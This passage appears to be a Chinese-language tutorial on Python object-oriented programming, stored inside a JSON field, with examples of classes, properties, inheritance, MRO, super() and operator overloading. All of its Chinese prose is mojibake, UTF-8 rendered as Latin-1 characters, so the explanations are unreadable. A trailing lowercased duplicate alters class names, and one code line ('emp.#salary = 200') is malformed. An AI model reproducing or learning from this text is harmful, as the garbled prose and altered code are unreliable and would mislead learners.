å½æ°ï¼è°ç¨å®æä¹åï¼ä¼å°åå»ºå¥½çå¯¹è±¡è¿åç»ç¸å³çåé\n\n__init__æ¹æ³å__new__æ¹æ³çåºå«ï¼\n\n * initæ¹æ³ç¨äºåå§ååå»ºå¥½çå¯¹è±¡ï¼åå§åæ¯æç»å¯¹è±¡çå®ä¾å±æ§èµå¼\n * newæ¹æ³ç¨äºåå»ºå¯¹è±¡ï¼æä»¬æ éå®ä¹è¯¥æ¹æ³\n * å¦æä¸å®ä¹initæ¹æ³ï¼ååJavaä¸æ ·ï¼é»è®¤ä¼æä¾ä¸ä¸ªé»è®¤çæ åæ°initæ¹æ³ï¼å¦æå®ä¹äºå¸¦åæ°çinitæ¹æ³ï¼åç³»ç»ä¸åå»ºé»è®¤çinitæ¹æ³\n\nå¨Pythonä¸­ï¼selfç¸å½äºjavaä¸­çthisï¼selfå¿é¡»ä¸ºæé å½æ°çç¬¬ä¸ä¸ªåæ°ï¼åå­ä¸è¬é½æ¯selfã\n\n\n# å®ä¾å±æ§åå®ä¾æ¹æ³\n\n# å®ä¾å±æ§\n\nå®ä¾å±æ§æ¯ä»å±äºå®ä¾å¯¹è±¡çå±æ§ï¼ä¹ç§°ä¸ºå®ä¾åéãå®ä¾å±æ§ä¸è¬å¨initæ¹æ³ä¸­è¿è¡åå§åï¼å¯ä»¥éè¿self.å®ä¾å±æ§åè®¿é®å®ä¾å±æ§ï¼å¨åå»ºå®ä¾å¯¹è±¡ä¹åï¼å¯ä»¥éè¿å¯¹è±¡å.å®ä¾å±æ§åãä¹å¯ä»¥æ°æ·»å å±æ§ã\n\n# å®ä¾æ¹æ³\n\nå®ä¾æ¹æ³æ¯ä»å±äºå®ä¾å¯¹è±¡çæ¹æ³ï¼å®ä¾æ¹æ³å®ä¹æ¶ï¼ç¬¬ä¸ä¸ªåæ°å¿é¡»ä¸ºselfï¼åé¢çä¸ºå½¢ååè¡¨ãå¨è°ç¨å®ä¾æ¹æ³æ¶ï¼ä¸éè¦ä¹ä¸è½ç»selfä¼ éåæ°ï¼selfç±è§£éå¨èªå¨ä¼ éåæ°ãæ¹æ³çå®ä¹æ ¼å¼å¦ä¸æç¤ºï¼\n\ndef say_score(self,abc):\n  print(self.name,'åæ°æ¯ï¼',self.score)\n  print(abc)\n# è°ç¨æ¹å¼\n  s1 = Student(\"zhangsan\",20)\n  s1.say_score(123) # zhangsan åæ°æ¯ï¼ 20 123\n\n\n1\n2\n3\n4\n5\n6\n\n\næ¹æ³åå½æ°æä»ä¹åºå«ï¼\n\n * æ¹æ³åå½æ°é½æ¯ç¨æ¥å®æç¹å®åè½çä»£ç å\n * æ¹æ³éè¿å¯¹è±¡æ¥è°ç¨ï¼ä»å±äºä¸ä¸ªå®ä¾å¯¹è±¡ï¼èå½æ°ä¸ä¸æ ·\n * æ¹æ³å®ä¹æ¯éè¦ä¼ éselfåæ°ï¼å½æ°ä¸éè¦ã\n\nä¸äºå¸¸è§çæä½ï¼\n\nclass Student:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n\n    def say_hello(self):\n        print(self.name,'hello')\n\n# è·åå¯¹è±¡çææå±æ§åæ¹æ³\ns = Student(\"zhangsan\",12)\nprint(dir(s)) # ['__class__', '__delattr__', '__dict__', '__dir__', '__doc__', '__eq__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__init_subclass__', '__le__', '__lt__', '__module__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasshook__', '__weakref__', 'age', 'name', 'say_hello']\n\nprint(s.__dict__) # {'name': 'zhangsan', 'age': 12}\n\npass # ç©ºè¯­å¥\n\nprint(isinstance(s, Student)) # True  å¤æ­å¯¹è±¡æ¯ä¸æ¯ä¸ºæç§ç±»å\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n\n# ç±»å¯¹è±¡ãç±»å±æ§ãç±»æ¹æ³ãéææ¹æ³\n\n# ç±»å¯¹è±¡\n\nPythonä¸­ä¸åé½æ¯å¯¹è±¡ï¼ç±»ä¹æ¯ï¼ç§°ä¸ºç±»å¯¹è±¡ï¼ä½¿ç¨classå³é®å­å®ä¹ã\n\nclass Student:\n    pass\n\ns = Student()\nprint(type(Student)) # <class 'type'>\n\nprint(type(Student())) # <class '__main__.Student'>\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# ç±»å±æ§\n\nç±»å±æ§æ¯ä»å±äºç±»å¯¹è±¡çå±æ§ï¼ä¹ç§°ä¸ºç±»åéï¼å ä¸ºä»å±äºç±»å¯¹è±¡ï¼å æ­¤å¯ä»¥è¢«ææçå®ä¾å¯¹è±¡å±äº«ã\n\nç±»å±æ§çå®ä¹æ¹å¼ï¼\n\nclass Student:\n    name = \"zhansgan\"\n\nprint(Student.name) # zhansgan\n\n\n1\n2\n3\n4\n\n\nå¯ä»¥éè¿ç±»å.ç±»åéçæ¹å¼è®¿é®ã\n\n# ç±»æ¹æ³\n\nç±»æ¹æ³æ¯ä»å±äºç±»å¯¹è±¡çæ¹æ³ï¼ä½¿ç¨@classmethodå®ä¹ãç¬¬ä¸ä¸ªclsåæ°å¿é¡»è¦ä¼ éï¼ä»£è¡¨çæ¯ç±»å¯¹è±¡çæ¬èº«ãè°ç¨ç±»æ¹æ³çæ¹å¼æ¯ï¼ç±»å.ç±»æ¹æ³å(åæ°åè¡¨)ãåæ°åè¡¨ä¸­ï¼ä¸éè¦ä¼ éclså¼ãç±»æ¹æ³ä¸­è®¿é®å®ä¾å±æ§åå®ä¾æ¹æ³å¯¼è´éè¯¯ï¼å­ç±»ç»§æ¿ç¶ç±»æ¹æ³æ¶ï¼ä¼ å¥clsæ¶å­ç±»å¯¹è±¡ï¼èå¹¶éæ¯ç±»å¯¹è±¡ã\n\nclass Student:\n    company = \"hello\"\n\n    @classmethod\n    def printConpany(cls):\n        print(cls.company)\n\nStudent.printConpany() # hello\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n# éææ¹æ³\n\nPythonä¸­åè®¸å®ä¹åç±»å¯¹è±¡æ å³çæ¹æ³ï¼ç§°ä¸ºéææ¹æ³ãéææ¹æ³åæ®éå½æ°æ²¡æåºå«ï¼åªä¸è¿éææ¹æ³æ¾å°äºç±»çåå­ç©ºé´éé¢ï¼éè¦éè¿ç±»æ¥è°ç¨ãéææ¹æ³çè°ç¨æ ¼å¼ä¸ºï¼ç±»å.éææ¹æ³å(åæ°åè¡¨)ãéææ¹æ³ä¸­è®¿é®å®ä¾å±æ§åå®ä¾æ¹æ³ä¼æ¥éã\n\nclass Student:\n    company = \"xxx\"\n\n    @staticmethod\n    def add(a,b):\n        print(\"{0}+{1}={2}\".format(a,b,a+b))\n        return a+b\n\nStudent.add(1,2) # 1+2=3\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n\n# __del__æ¹æ³ååå¾åæ¶\n\n__del__æ¹æ³ç§°ä¸ºæææ¹æ³ï¼ç¨äºå®ç°å¯¹è±¡éæ¯æ¶æéè¦çæä½ãæ¯å¦éæ¾å¯¹è±¡èµæºç­ç­ãPythonå¯ä»¥å®ç°èªå¨çåå¾åæ¶æºå¶ï¼å½å¯¹è±¡æ²¡æè¢«å¼ç¨æ¶ï¼ç±åå¾åæ¶å¨è°ç¨__delââ_æ¹æ³ãæä»¬å¯ä»¥ä½¿ç¨delå é¤å¯¹è±¡ï¼è°ç¨__del__æ¹æ³ã\n\nclass Person:\n    def __del__(self):\n        print(\"éæ¯å¯¹è±¡ï¼{0}\".format(self))\n\np1 = Person()\np2 = Person()\ndel p2\nprint(\"----\")\n\n\"\"\"\néæ¯å¯¹è±¡ï¼<__main__.Person object at 0x7fd23000b5e0>\n----\néæ¯å¯¹è±¡ï¼<__main__.Person object at 0x7fd23000be80>\n\"\"\"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# __call__æ¹æ³åå¯è°ç¨å¯¹è±¡\n\nå®ç°äº__call__æ¹æ³çå¯¹è±¡ç§°ä¸ºå¯è°ç¨å¯¹è±¡ï¼å³è¯¥å¯¹è±¡å¯ä»¥è¢«åå½æ°ä¸æ ·è°ç¨ã\n\nclass CalcUtil:\n    def __call__(self,a,b):\n        print(\"{0}+{1}={2}\".format(a,b,a+b))\n\ns = CalcUtil()\ns(1,2) # 1+2=3\n\n\n1\n2\n3\n4\n5\n6\n\n\n\n# æ¹æ³éè½½\n\nå¨Pythonä¸­æ¹æ³æ²¡æéè½½ï¼å¶ä»è¯­è¨ä¸­ï¼å¯ä»¥å®ä¹å¤ä¸ªååçæ¹æ³ï¼åªè¦ä¿è¯æ¹æ³çç­¾åå¯ä¸å³å¯ãæ¹æ³çç­¾ååå«æ¹æ³åï¼åæ°æ°éååæ°ç±»åã\n\nPythonä¸­ï¼æ¹æ³çåæ°æ²¡æå£°æåæ°ç±»åï¼åæ°çæ°éä¹å¯ä»¥ç±å¯ååæ°æ§å¶ãå æ­¤Pythonä¸­ä¸å­å¨æ¹æ³éè½½ãå¦æå¨ç±»ä¸­å®ä¹äºå¤ä¸ªååæ¹æ³ï¼åªææåä¸ä¸ªæ¹æ³æ¯ææçã\n\nclass Person:\n    def say(self):\n        print(\"hello1\")\n    def say(self):\n        print(\"hello2\")\n\np1 = Person()\np1.say() # hello2\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# æ¹æ³çå¨ææ§\n\nPythonæ¯ä¸ç§å¨æè¯­è¨ï¼æä»¬å¯ä»¥ç»ç±»æ·»å æ°çæ¹æ³ï¼æèå¨æçä¿®æ¹ç±»ç°æçä¸äºæ¹æ³ã\n\nclass Person:\n    def work(self):\n        print(\"shangban\")\n\ndef play(self):\n        print(\"play\")\n\ndef work2(self):\n    print(\"work2\")\n\nPerson.play_game = play\nPerson.work = work2\n\np = Person()\n\nprint(dir(p))\n\np.play_game() # play\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# ç§æå±æ§åç§ææ¹æ³\n\nPythonå¯¹äºç±»çæåæ²¡æä¸¥æ ¼è®¿é®çæ§å¶éå¶ï¼è¿åå¶ä»çé¢åç¬äº«çè¯­è¨ææåºå«ãéå¸¸æåµä¸æä»¬çº¦å®ä¸¤ä¸ªä¸åçº¿å¼å¤´çå±æ§æ¯ç§æå±æ§ï¼å¶ä»çä¸ºå¬å±çãç±»åé¨å¯ä»¥è®¿é®ç§æå±æ§ï¼ç±»å¤é¨ä¸è½ç´æ¥è®¿é®ç§æçå±æ§ãç±»å¤é¨å¯ä»¥éè¿_ç±»å__ç§æå±æ§åè®¿é®ç§æå±æ§æèæ¹æ³ã\n\nclass Employee:\n    __company = \"aaa\"\n\n    def __init__(self,name,age):\n        self.name = name\n        self.__age = age\n    def say_company(self):\n        print(\"æçå¬å¸æ¯ï¼\",Employee.__company) # æçå¬å¸æ¯ï¼ aaa\n        print(self.name,\"çå¹´é¾æ¯\",self.__age) # zhangsan çå¹´é¾æ¯ 12\n        self.__work()\n\n    def __work(self):\n        print(\"work\") # work\n\ne1 = Employee(\"zhangsan\",12)\nprint(e1.name)  # zhangsan\nprint(e1._Employee__age) # 12\ne1.say_company()\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# @propertyè£é¥°å¨\n\n@propertyå¯ä»¥å°ä¸ä¸ªæ¹æ³çè°ç¨åä¸ºå¯¹å±æ§çè°ç¨ã\n\nclass Employee:\n\n    @property\n    def salary(self):\n        return 2000\n\nemp = Employee()\nprint(emp.salary) # 2000\nprint(type(emp.salary)) # <class 'int'>\n\n# emp.salary() # TypeError: 'int' object is not callable\n\nemp.#salary = 200 # AttributeError: can't set attribute 'salary'\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n@propertyç¨äºå¸®å©æä»¬å¤çå±æ§çè¯»åæä½ï¼å¯¹äºå±æ§æä»¬å¯ä»¥ç´æ¥èµå¼çæ¹å¼è¯»åï¼ä½æ¯å¯¹äºä¸äºæ°æ®ï¼æä¸äºèå´çéå¶ï¼å¿é¡»éè¿setgetæ¹æ³æ¥è¿è¡åå¥åè¯»åã\n\nclass Employee:\n\n    def __init__(self):\n        self.__salary = 0\n\n    @property\n    def salary(self):\n        return self.__salary\n\n    @salary.setter\n    def salary(self,salary):\n        if(0<salary<1000):\n            self.__salary = salary\n        else:\n            print(\"æ°æ®å¼å¸¸\")\n\nemp = Employee()\nprint(emp.salary)\nemp.salary = 200\nprint(emp.salary) # 200\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n\n\n\n# é¢åå¯¹è±¡çä¸å¤§ç¹å¾\n\nPythonæ¯é¢åå¯¹è±¡çè¯­è¨ï¼æ¯æé¢åå¯¹è±¡çä¸å¤§ç¹å¾ï¼åå«æ¯å°è£ç»§æ¿åå¤æã\n\n * å°è£æ¯éèå¯¹è±¡çå±æ§åå®ç°çå·ä½ç»èï¼åªå¯¹å¤æä¾å¿è¦çæ¹æ³ï¼ç¸å½äºå°ç»èå°è£èµ·æ¥ï¼åªå¯¹å¤æ´é²ç¸å³çè°ç¨æ¹æ³ã\n * ç»§æ¿å¯ä»¥è®©å­ç±»å·æç¶ç±»çç¹æ§ï¼å¯ä»¥æé«ä»£ç çéç¨æ§\n * å¤ææçæ¯åä¸ä¸ªæ¹æ³è°ç¨å ä¸ºä¸åçå¯¹è±¡ä¼äº§çä¸åçè¡ä¸ºã\n\n\n# ç»§æ¿\n\nç»§æ¿æ¯é¢åå¯¹è±¡çä¸ä¸ªéè¦ç¹æ§ï¼ä¹æ¯å®ç°ä»£ç å¤ç¨çéè¦çææ®µãPythonä¸­å¯ä»¥å®ç°å¤éç»§æ¿ï¼ä¸ä¸ªå­ç±»å¯ä»¥ç»§æ¿å¤ä¸ªç¶ç±»ï¼å¦æå¨ç±»å®ä¹ä¸­æ²¡ææå®ç¶ç±»ï¼åé»è®¤æ¯ç»§æ¿Objectç±»ï¼Objecç±»æ¯ææçç±»çç¶ç±»ãå®ä¹å­ç±»æ¶å¿é¡»å¨æé å½æ°ä¸­è°ç¨ç¶ç±»çæé å½æ°ï¼è°ç¨æ¹å¼å¦ä¸ï¼ç¶ç±»å.__init___(self,åæ°åè¡¨)\n\nç¤ºä¾ä»£ç ï¼\n\nclass Person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass Student(Person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        Person.__init__(self,name,age)\n\ns1 = Student(\"zhangsan\",12,1,100)\ns1.say_hello() # hello, zhangsan\nprint(dir(s1))\nprint(s1.name) # zhangsan\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# ç±»æåçç»§æ¿åéå\n\n 1. æåç»§æ¿ï¼å­ç±»å¯ä»¥ç»§æ¿ç¶ç±»é¤äºæé æ¹æ³ä»¥å¤çæææåã\n 2. æ¹æ³éåï¼å­ç±»å¯ä»¥éæ°å®ä¹ç¶ç±»ä¸­çæ¹æ³ï¼è¦çæåæ¬çç¶ç±»æ¹æ³ï¼ç§°ä¸ºéåã\n\nclass Person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass Student(Person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        Person.__init__(self,name,age)\n\n    def say_hello(self):\n        print(\"i am a student\")\n\ns1 = Student(\"zhangsan\",12,1,100)\ns1.say_hello() # i am a student\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n# æ¥çç±»çå±æ¬¡ç»æ\n\nå¯ä»¥éè¿ç±»æ¹æ³mro() æèç±»å±æ§__mro__è¾åºç±»çå±æ¬¡ç»æ\n\nclass Person:\n    def __init__(self,name,age):\n        self.name = name\n        self.age = age\n    def say_hello(self):\n        print(\"hello,\",self.name)\n\nclass Student(Person):\n\n    def __init__(self,name,age,class_id,score):\n        self.class_id = class_id\n        self.score = score\n        Person.__init__(self,name,age)\n\n    def say_hello(self):\n        print(\"i am a student\")\n\nprint(Student.mro()) # [<class '__main__.Student'>, <class '__main__.Person'>, <class 'object'>]\n\nprint(Student.__mro__) # (<class '__main__.Student'>, <class '__main__.Person'>, <class 'object'>)\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n\n\n# Objectç±»\n\nobjectç±»æ¯ææç±»çç¶ç±»ï¼objectä¸­çæ¹æ³å¨æ¯ä¸ªç±»ä¸­é½å­å¨ã\n\nå¯ä»¥éè¿dir()æ¥æ¥çå¯¹è±¡çå±æ§ï¼æä»¬å¯ä»¥éè¿dirå½æ°ï¼äº§çç½®é¡¶å¯¹è±¡ä¸­çææå±æ§ã\n\nå¨objectä¸­æä¸ä¸ª__str__()æ¹æ³ï¼è¯¥æ¹æ³ç¨äºè¿åä¸ä¸ªå¯¹è±¡çä¿¡æ¯ãç±»ä¼¼äºjavaä¸­çtoStringæ¹æ³ã\n\nclass Person:\n    def __str__(self):\n        print(\"person\")\n        return \"i am a person\"\n\np = Person()\nprint(p) # i am a person\n\n\n1\n2\n3\n4\n5\n6\n7\n\n\n# å¤éç»§æ¿\n\nåJavaä¸ä¸æ ·ï¼Pythonæ¯æ¯æå¤éç»§æ¿çï¼å æ­¤ä¸ä¸ªå­ç±»å¯ä»¥æå¤ä¸ªç´æ¥çç¶ç±»ãä½æ¯è¿æ ·çç»§æ¿æ¹å¼å¾å¾å¤ªå¤æï¼åºè¯¥å°½éçé¿åä½¿ç¨ã\n\n# mro()\n\npythonä¸­æ¯æå¤éç»§æ¿ï¼å¦æç¶ç±»ä¸­æç¸ååå­çæ¹æ³ï¼å¨å­ç±»ä¸­æ²¡ææå®ç¶ç±»åæ¶ï¼é»è®¤æç§ä»ååå³çé¡ºåºæç´¢ãMRO(Method Resolution Order)ï¼æ¹æ³çè§£æé¡ºåºã\n\n# super() è·å¾ç¶ç±»å®ä¹\n\nå¨å­ç±»ä¸­ï¼å¦ææ³è¦è·å¾æä¸ªç¶ç±»çæ¹æ³æ¶ï¼æä»¬å¯ä»¥éè¿superæ¥è°ç¨ï¼superä»£è¡¨çæ¯ç¶ç±»çå®ä¹ï¼èä¸æ¯ç¶ç±»çå¯¹è±¡ã\n\nclass Person:\n    def __str__(self):\n        print(\"person\")\n        return \"i am a person\"\n    def say(self):\n        print(\"say\")\n\nclass Student(Person):\n    def say(self):\n        print(\"student\")\n        super().say()\n\ns1 = Student()\ns1.say()  # student say\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n\n\n\n# å¤æ\n\nå¤ææçæ¯åä¸ä¸ªæ¹æ³å ä¸ºä¸éçå¯¹è±¡è°ç¨æäº§ççä¸åçè¡ä¸ºãå¤ææ¯æ¹æ³çå¤æï¼å¯¹äºå±æ§å¹¶æ²¡æå¤æï¼å¤ææä¸¤ä¸ªéè¦çæ¡ä»¶ï¼ä¸ä¸ªæ¯ç»§æ¿ï¼ä¸ä¸ªæ¯æ¹æ³çéåã\n\nclass Animal:\n    def shout(self):\n        print(\"animal shout\")\n\nclass Dog(Animal):\n    def shout(self):\n        print(\"wang wang\")\n\nclass Cat(Animal):\n    def shout(self):\n        print(\"miaomiao\")\n\ndef animalShot(a):\n    if isinstance(a,Animal):\n        a.shout()\n\nanimalShot(Cat()) # miaomiao\nanimalShot(Dog()) # wang wang \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n# ç¹æ®æ¹æ³åè¿ç®ç¬¦éè½½\n\nPythonä¸­çè¿ç®ç¬¦å®éä¸é½æ¯éè¿è°ç¨å¯¹è±¡çç¹æ®æ¹æ³å®ç°çã\n\na = 10\nb = 20\nc = a+b\nd = a.__add__(b)\nprint(c) # 30\nprint(d) # 30\n\n\n1\n2\n3\n4\n5\n6\n\n\nPythonä¸äºç¹æ®çæ¹æ³ï¼\n\næ¹æ³                 è¯´æ      ä¾å­\n__init__           æé æ¹æ³    å¯¹è±¡åå»ºï¼p = Person()\n__del__            æææ¹æ³    å¯¹è±¡åæ¶\n__repr__,__str__   æå°ï¼è½¬æ¢   print(a)\n__call__           å½æ°è°ç¨    a()\n__getattr__        ç¹å·è¿ç®    a.xxx\n__setattr__        å±æ§èµå¼    a.xxx = value\n__getitem__        ç´¢å¼è¿ç®    a[key]\n__setitem__        ç´¢å¼èµå¼    a[key]=value\n__len__            é¿åº¦      len(a)\n\nè¿ç®ç¬¦æå¯¹åºçç¹æ®çæ¹æ³å¦ä¸ï¼\n\nè¿ç®ç¬¦        ç¹æ®æ¹æ³                                       è¯´æ\nè¿ç®ç¬¦+       __add__                                    å æ³\nè¿ç®ç¬¦-       __sub__                                    åæ³\n<,<=,==    __lt__,__le__ï¼__eq__                       æ¯è¾è¿ç®ç¬¦\n>,>=,!=    __gt__,__ge__,__ne__                       \n|,^,&      __or__,__xor__,__and__                     æãå¼æãä¸\n<<,>>      __lshift__,__rshift__                      å·¦ç§»ãå³ç§»\n*,/,%,//   __mul__,__truediv__,__mod__,__floordiv__   ä¹ãæµ®ç¹é¤ãæ¨¡è¿ç® ï¼åä½ï¼ãæ´æ°é¤\n**         __pow__                                    ææ°è¿ç®\n\næä»¬å¯ä»¥éåä»¥ä¸çæ¹æ³å®ç°æ¹æ³çéè½½ï¼\n\nclass Person:\n    def __init__(self,name):\n        self.name = name\n\n    def __add__(self, other):\n        if isinstance(other,Person):\n            return \"{0} -- {1} \".format(self.name,other.name)\n        else:\n            return \"error\"\n\ns1 = Person(\"zhangsan\")\ns2 = Person(\"lisi\")\nprint(s1 + s2) # zhangsan -- lisi \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n# ç¹æ®çå±æ§\n\nPythonä¸­å¯¹è±¡åå«äºå¾å¤ä»¥ä¸åçº¿å¼å§åç»æçå±æ§ï¼è¿äºç¹æ®å±æ§å¸¸è§çå¦ä¸ï¼\n\nç¹æ®æ¹æ³                     å«ä¹\nobj.__dict__             å¯¹è±¡çå±æ§å­å¸\nobj.__class__            å¯¹è±¡æå±çç±»\nclass.__bases__          ç±»çåºç±»åç»ï¼å¤ç»§æ¿ï¼\nclass.__base__           ç±»çåºç±»\nclass.__mro__            ç±»å±æ¬¡ç»æ\nclass.__subclasses__()   å­ç±»åè¡¨\n\n# å¯¹è±¡çæ·±æµæ·è´\n\nå¨ä¸é¢æä»¬å¶å®å·²ç»æå°å¯¹è±¡çæ·±æµæ·è´çé®é¢ï¼æµæ·è´æ¶å¯¹è±¡åå«çå­å¯¹è±¡ä¸ä¼è¢«æ·è´ï¼æ·±æ·è´åæ·è´å­å¯¹è±¡ãpythonä¸­ä½¿ç¨copy.copy()å®ç°æµæ·è´ï¼ä½¿ç¨copy.deepcopy()å®ç°æ·±æ·è´ã",normalizedContent:"# pythoné¢åå¯¹è±¡çé£äºäº\n\n> pythonæ¯ä¸é¨æ¯æé¢åå¯¹è±¡çé«çº§ç¨åºè®¾è®¡è¯­è¨ãé¢åå¯¹è±¡åé¢åè¿ç¨çç¨åºè®¾è®¡è¯­è¨ä¸åï¼é¢åå¯¹è±¡æ´åæ¯æ­ç§¯æ¨ï¼å°ä¸åä¸åç°æçåè½ç»åè°ç¨å®ææä»¬çä»»å¡ãèé¢åè¿ç¨éè¦æä»¬å»æèæ¯ä¸æ­¥åºè¯¥æä¹å»åãè¿ä¸ç¯æä»¬ä¸èµ·æ¥ççpythonä¸­çé¢åå¯¹è±¡çç¸å³ç¥è¯ã\n\n\n# é¢åå¯¹è±¡ç®ä»\n\npythonæ¯ä¸é¨å®å¨éç¨äºé¢åå¯¹è±¡ææ³è®¾è®¡çé«çº§è¯­è¨ï¼å¯ä»¥å®å¨æ¯æé¢åå¯¹è±¡ä¸­çåºæ¬åè½ï¼æ¯å¦ï¼ç»§æ¿ãå°è£ãå¤æç­ãå¨pythonä¸­ä¸åé½æ¯å¯¹è±¡ï¼åæ¬æä»¬åé¢æå°è¿çæ°æ®ç±»åãå½æ°ç­ã\n\né¢åå¯¹è±¡åé¢åè¿ç¨ä¸åçæ¯ï¼é¢åè¿ç¨æ´å å³æ³¨ç¨åºçæ§è¡æµç¨åé»è¾ï¼é¢åè¿ç¨æ´å å³æ³¨çæ¯è½¯ä»¶å¯¹è±¡ä¹é´çå³ç³»ï¼æ¯ä¸ç§å¸åçè®¾è®¡èçæç»´ã\n\n\n# ç±»\n\nç±»æ¯ä»ä¹ï¼ç®åæ¥è¯´ï¼ç±»æ¯ä¸äºå·æç¸åç¹å¾äºç©çæ½è±¡ï¼æ¯å¦ä¸å é¥¼å¹²ï¼ç±»å°±æ¯é é¥¼å¹²çç£¨å·ã\n\næä»¬éè¿ç±»æ¥å®ä¹æ°æ®ç±»åçå±æ§åæ¹æ³ï¼ç±»å¯ä»¥å°è¡ä¸ºåç¶ææ¾å°ä¸èµ·ãèå¯¹è±¡å°±æ¯ä¸ä¸ªç±»çå®ä¾ï¼å¯ä»¥çä½æ¯é¥¼å¹²ãä¸ä¸ªç±»åå»ºå¯¹è±¡æ¶ï¼ä¼å±äº«ç±»ä¸­å®ä¹çæ¹æ³ï¼ä½æ¯ä¸ä¼å±äº«ç±»ä¸­çæ°æ®ã\n\npythonä¸­ä¸åé½æ¯å¯¹è±¡ï¼å æ­¤ç±»ä¹æ¯å¯¹è±¡ï¼ç±»ç§°ä¸ºç±»å¯¹è±¡ï¼ç±»çå®ä¾ç§°ä¸ºå®ä¾å¯¹è±¡ã\n\næä¹å®ä¹ä¸ä¸ªç±»ï¼å®ä¹ä¸ä¸ªç±»æå¦ä¸çå ä¸ªè¦æ±ï¼\n\n 1. ç±»åç§°è¦ç¬¦åæ è¯ç¬¦çå®ä¹è§åï¼é¦å­æ¯å¤§åï¼ä½¿ç¨é©¼å³°å½ååå\n 2. ç±»ä¸­å¯ä»¥å®ä¹å±æ§åæ¹æ³\n 3. ç±»ä¸­çå±æ§ç¨äºæè¿°æ°æ®ï¼æ¹æ³ç¨äºæè¿°æ°æ®ç¸å³çä¸äºæä½ã\n\nclass student:\n    def __init__(self,name,score):\n        self.name = name\n        self.score = score\n\n    def say_score(self):\n        print(self.name,'åæ°æ¯ï¼',self.score)\n\n\ns1 = student(\"zhangsan\",20)\ns1.say_score() # zhangsan åæ°æ¯ï¼ 20\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# __init__æé æ¹æ³å__new__æ¹æ³\n\nç±»æ¯æ½è±¡çï¼ç±»æ¯å¯¹è±¡çæ¨¡çï¼æä»¬å¯ä»¥éè¿ç±»æ¨¡çåå»ºåºç±»çå®ä¾å¯¹è±¡ï¼ç¶åè°ç¨å®ä¾å¯¹è±¡çç¸å³åè½ãä¸ä¸ªpythonçå¯¹è±¡åå«å¦ä¸çå ä¸ªé¨åï¼\n\n 1. id identityè¯å«ç \n 2. type å¯¹è±¡çç±»å\n 3. value å¯¹è±¡çå¼\n    1. å±æ§ attribute\n    2. æ¹æ³ method\n\nå¨åå»ºä¸ä¸ªç±»æ¶ï¼æä»¬éè¦å®ä¹ä¸ä¸ªæé æ¹æ³ï¼__init__ï¼è¯¥æ¹æ³ç±»ä¼¼äºjavaä¸­çåç±»ååçæ¹æ³ï¼ç¨äºå®ä¾å¯¹è±¡çåå§åãå¨åå»ºå¯¹è±¡åï¼æ§è¡è¯¥æ¹æ³ï¼åå§åå¯¹è±¡çç¸å³å±æ§ã\n\n__init__æ¹æ³çç¸å³è¦ç¹ï¼\n\n 1. åç§°åºå®ã\n 2. ç¬¬ä¸ä¸ªåæ°åºå®ä¸ºselfãselfæçæ¯åååå»ºçå¯¹è±¡\n 3. æé å½æ°éå¸¸ç¨æ¥åå§åå®ä¾å¯¹è±¡çå®ä¾å±æ§\n 4. éè¿ç±»å(å½¢ååè¡¨)è°ç¨æé å½æ°ï¼è°ç¨å®æä¹åï¼ä¼å°åå»ºå¥½çå¯¹è±¡è¿åç»ç¸å³çåé\n\n__init__æ¹æ³å__new__æ¹æ³çåºå«ï¼\n\n * initæ¹æ³ç¨äºåå§ååå»ºå¥½çå¯¹è±¡ï¼åå§åæ¯æç»å¯¹è±¡çå®ä¾å±æ§èµå¼\n * newæ¹æ³ç¨äºåå»ºå¯¹è±¡ï¼æä»¬æ éå®ä¹è¯¥æ¹æ³\n * å¦æä¸å®ä¹initæ¹æ³ï¼ååjavaä¸æ ·ï¼é»è®¤ä¼æä¾ä¸ä¸ªé»è®¤çæ åæ°initæ¹æ³ï¼å¦æå®ä¹äºå¸¦åæ°çinitæ¹æ³ï¼åç³»ç»ä¸åå»ºé»è®¤çinitæ¹æ³\n\nå¨pythonä¸­ï¼selfç¸å½äºjavaä¸­çthisï¼selfå¿é¡»ä¸ºæé å½æ°çç¬¬ä¸ä¸ªåæ°ï¼åå­ä¸è¬é½æ¯selfã\n\n\n# å®ä¾å±æ§åå®ä¾æ¹æ³\n\n# 